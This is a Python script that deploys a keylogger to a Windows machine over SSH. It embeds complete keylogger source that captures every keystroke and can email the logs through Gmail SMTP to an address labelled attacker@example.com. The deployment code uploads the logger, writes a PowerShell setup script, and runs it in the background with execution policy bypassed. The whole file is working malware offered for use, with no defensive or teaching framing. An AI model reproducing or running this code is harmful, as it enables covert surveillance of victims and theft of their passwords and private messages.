#!/usr/bin/env python3
# remote_keylogger_deploy.py - Deploys a keylogger to a Windows target from Linux
import paramiko
import argparse
import time

# Keylogger code to be deployed on the target
KEYLOGGER_CODE = '''
import os
import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Timer
from datetime import datetime

# Configure this with your exfiltration details
SEND_REPORT_EVERY = 300  # seconds
EMAIL_ADDRESS = "attacker@example.com"
EMAIL_PASSWORD = "your_password"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt).replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt).replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = f"Keylogger Report [{self.filename}]"
        msg.attach(MIMEText(message, "plain"))
        return msg

    def sendmail(self, message):
        try:
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(self.prepare_mail(message))
            server.quit()
            print(f"[+] Email sent")
        except Exception as e:
            print(f"[!] Error sending email: {e}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"[+] Keylogger started")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
'''

def deploy_keylogger(hostname, username, password):
    try:
        # Set up SSH connection
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"[*] Connecting to {hostname}")
        client.connect(hostname, username=username, password=password)
        
        # Create SFTP session
        sftp = client.open_sftp()
        
        # Create and write the keylogger script
        print("[*] Uploading keylogger script")
        with sftp.file('keylogger.py', 'w') as f:
            f.write(KEYLOGGER_CODE)
        
        # Create a PowerShell script to install dependencies and run the keylogger
        setup_script = '''
        # Install Python if not already installed (this is just a placeholder - you'd need to handle this separately)
        # Install required Python packages
        pip install keyboard
        
        # Run the keylogger in the background
        pythonw.exe keylogger.py
        '''
        
        with sftp.file('setup.ps1', 'w') as f:
            f.write(setup_script)
        
        # Execute the setup script with PowerShell
        print("[*] Installing dependencies and starting keylogger")
        stdin, stdout, stderr = client.exec_command('powershell.exe -ExecutionPolicy Bypass -File setup.ps1')
        
        # Print any output
        print(stdout.read().decode())
        print(stderr.read().decode())
        
        print("[+] Keylogger deployed successfully")
    
    except Exception as e:
        print(f"[-] Deployment failed: {e}")
    
    finally:
        if 'client' in locals():
            client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Deploy a keylogger remotely to a Windows machine')
    parser.add_argument('hostname', help='Target hostname or IP')
    parser.add_argument('username', help='Username for SSH authentication')
    parser.add_argument('password', help='Password for SSH authentication')
    
    args = parser.parse_args()
    
    deploy_keylogger(args.hostname, args.username, args.password)
